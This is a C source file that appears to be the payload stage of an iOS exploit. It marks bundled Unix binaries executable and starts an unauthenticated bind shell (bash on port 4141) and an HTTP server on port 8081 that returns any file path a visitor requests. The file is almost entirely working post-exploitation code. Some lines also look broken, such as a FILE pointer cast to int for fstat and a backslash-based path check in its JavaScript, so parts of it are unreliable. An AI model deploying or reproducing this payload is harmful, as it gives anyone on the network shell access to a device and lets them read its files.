/* J. Levin has compiled a bunch of Apple opensource utilites for arm64
 * You can get them from his site here: http://newosxbook.com/tools/iOSBinaries.html
 *
 * Follow the link to "The 64-bit tgz pack"
 *
 * Unpack the tarball into a directory called iosbinpack64 and drag-and-drop
 * that directory into the directory with all the source files in in XCode
 * so that it ends up in the .app bundle
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include <spawn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>

char* bundle_path() {
  CFBundleRef mainBundle = CFBundleGetMainBundle();
  CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
  int len = 4096;
  char* path = malloc(len);
  
  CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
  
  return path;
}

char* prepare_directory(char* dir_path) {
  DIR *dp;
  struct dirent *ep;
  
  char* in_path = NULL;
  char* bundle_root = bundle_path();
  asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);

  
  dp = opendir(in_path);
  if (dp == NULL) {
    printf("unable to open payload directory: %s\n", in_path);
    return NULL;
  }
  
  while ((ep = readdir(dp))) {
    char* entry = ep->d_name;
    char* full_entry_path = NULL;
    asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
    
    printf("preparing: %s\n", full_entry_path);
    
    // make that executable:
    int chmod_err = chmod(full_entry_path, 0777);
    if (chmod_err != 0){
      printf("chmod failed\n");
    }
    
    free(full_entry_path);
  }
  
  closedir(dp);
  free(bundle_root);

  return in_path;
}

// prepare all the payload binaries under the iosbinpack64 directory
// and build up the PATH
char* prepare_payload() {
  char* path = calloc(4096, 1);
  strcpy(path, "PATH=");
  char* dir;
  dir = prepare_directory("bin");
  strcat(path, dir);
  strcat(path, ":");
  free(dir);
  
  dir = prepare_directory("sbin");
  strcat(path, dir);
  strcat(path, ":");
  free(dir);
  
  dir = prepare_directory("usr/bin");
  strcat(path, dir);
  strcat(path, ":");
  free(dir);
  
  dir = prepare_directory("usr/local/bin");
  strcat(path, dir);
  strcat(path, ":");
  free(dir);
  
  dir = prepare_directory("usr/sbin");
  strcat(path, dir);
  strcat(path, ":");
  free(dir);
  
  strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");

  return path;
}

#pragma mark - HTTP Server

#define START_HTML "<html><body>"
#define END_HTML "</body></html>"

#define HTTP_404 "<h1>404 Not Found</h1>"

#define FORM_SOURCE "<script type=\"text/javascript\">" \
"function dl() {" \
"var p = document.getElementById('path').value;" \
"if (p[0] != '\') p += '\';" \
"window.location.href = document.location.origin + p;" \
"}</script>" \
"<h2>Enter full file path:</h2>" \
"<input type=\"text\" id=\"path\" placeholder=\"Enter path here\" />" \
"<input type=\"button\" onclick=\"dl()\" value=\"Download\"/>"

void send_html(int connection, int statusCode, char *source) {
  char headerbuf[256] = {0};
  size_t length = strlen(source);
  
  size_t sz;
  
  sz = snprintf(headerbuf, 256, "HTTP/1.1 %d NOTNECESSARY\r\n", statusCode);
  write(connection, headerbuf, sz);
  
  sz = snprintf(headerbuf, 256, "Content-Type: text/html\r\n");
  write(connection, headerbuf, sz);
  
  sz = snprintf(headerbuf, 256, "Content-Length: %zu\r\n\r\n", length);
  write(connection, headerbuf, sz);
  
  write(connection, source, length);
}

void send_form(int connection) {
  char *source = START_HTML FORM_SOURCE END_HTML;
  send_html(connection, 200, source);
}

void send_404(int connection) {
  char *source = START_HTML HTTP_404 FORM_SOURCE END_HTML;
  send_html(connection, 404, source);
}

void send_file(int connection, char *filePath) {
  char headerbuf[256] = {0};
  
  char fbuf[1024] = {0};
  
  char *fileName = "default.bin";
  
  for (char *i = filePath; *i; i++) {
    if (*i == '/') {
      fileName = i + 1;
    }
  }
  
  int sz;
  
  FILE *f = fopen(filePath, "rb");
  
  struct stat f_stat;
  
  if (!f) {
    send_404(connection);
    return;
  }
  
  printf("File opened. Checking file\n");
  
  fstat((int) f, &f_stat);
  
  if (S_ISDIR(f_stat.st_mode)) {
    printf("Not a regular file\n");
    send_404(connection);
    fclose(f);
    return;
  }
  
  size_t size;
  
  fseek(f, 0L, SEEK_END);
  size = ftell(f);
  fseek(f, 0L, SEEK_SET);
  
  printf("File size is %zu bytes.\n", size);
  
  sz = snprintf(headerbuf, 256, "HTTP/1.1 200 OK\r\n");
  write(connection, headerbuf, sz);
  
  sz = snprintf(headerbuf, 256, "Content-Type: application/octet-stream\r\n");
  write(connection, headerbuf, sz);
  
  sz = snprintf(headerbuf, 256, "Content-Disposition:attachment;filename=%s\r\n", fileName);
  write(connection, headerbuf, sz);
  
  sz = snprintf(headerbuf, 256, "Content-Length: %zu\r\n\r\n", size);
  write(connection, headerbuf, sz);
  
  printf("Starting to send file\n");
  
  while ((size = fread(fbuf, 1, 1024, f)) > 0) {
    write(connection, fbuf, size);
  }
}

void do_bind_http(int port) {
  struct sockaddr_in sa;
  sa.sin_len = 0;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = INADDR_ANY;
  
  int sock = socket(PF_INET, SOCK_STREAM, 0);
  bind(sock, (struct sockaddr*)&sa, sizeof(sa));
  listen(sock, 1);
  
  printf("listening http on %d\n", (int)port);
  
  for (;;) {
    int conn = accept(sock, 0, 0);
    char inbuf[1024] = {0};
    char filebuf[256] = {0};
    
    printf("Got connection\n");
    
    size_t bytesRead = read(conn, inbuf, 1023);
    printf("Read %zu\n", bytesRead);
    
    for (int i = 4; i < 256 && !isspace(inbuf[i]); ++i) {
      filebuf[i - 4] = inbuf[i];
    }
    
    printf("Accessing %s\n", filebuf);
    
    if (strlen(filebuf) < 2) {
      printf("Sending form\n");
      send_form(conn);
    } else {
      printf("Trying to send file\n");
      send_file(conn, filebuf);
    }
    
    close(conn);
  }
}

void* do_bind_http_thread(void* args) {
  do_bind_http(8081);
  return NULL;
}

#pragma mark - Bash Server

void do_bind_shell(char* env, int port) {
  char* bundle_root = bundle_path();
  
  char* shell_path = NULL;
  asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
  
  char* argv[] = {shell_path, NULL};
  char* envp[] = {env, NULL};
  
  struct sockaddr_in sa;
  sa.sin_len = 0;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = INADDR_ANY;
  
  int sock = socket(PF_INET, SOCK_STREAM, 0);
  bind(sock, (struct sockaddr*)&sa, sizeof(sa));
  listen(sock, 1);
  
  printf("shell listening on port %d\n", port);
  
  for(;;) {
    int conn = accept(sock, 0, 0);
    
    posix_spawn_file_actions_t actions;
    
    posix_spawn_file_actions_init(&actions);
    posix_spawn_file_actions_adddup2(&actions, conn, 0);
    posix_spawn_file_actions_adddup2(&actions, conn, 1);
    posix_spawn_file_actions_adddup2(&actions, conn, 2);
    

    pid_t spawned_pid = 0;
    int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
    
    if (spawn_err != 0){
      perror("shell spawn error");
    } else {
      printf("shell posix_spawn success!\n");
    }
    
    posix_spawn_file_actions_destroy(&actions);
    
    printf("our pid: %d\n", getpid());
    printf("spawned_pid: %d\n", spawned_pid);
    
    int wl = 0;
    while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
  }
  
  free(shell_path);
}

void* do_bind_shell_thread(void* args) {
  char* env_path = prepare_payload();
  printf("will launch a shell with this environment: %s\n", env_path);
  
  do_bind_shell(env_path, 4141);
  free(env_path);
  
  return NULL;
}

void drop_payload() {
  pthread_t shellThread;
  pthread_t httpThread;
  
  pthread_create(&shellThread, NULL, &do_bind_shell_thread, NULL);
  pthread_create(&httpThread, NULL, &do_bind_http_thread, NULL);
  
  pthread_join(shellThread, NULL);
  pthread_join(httpThread, NULL);
}
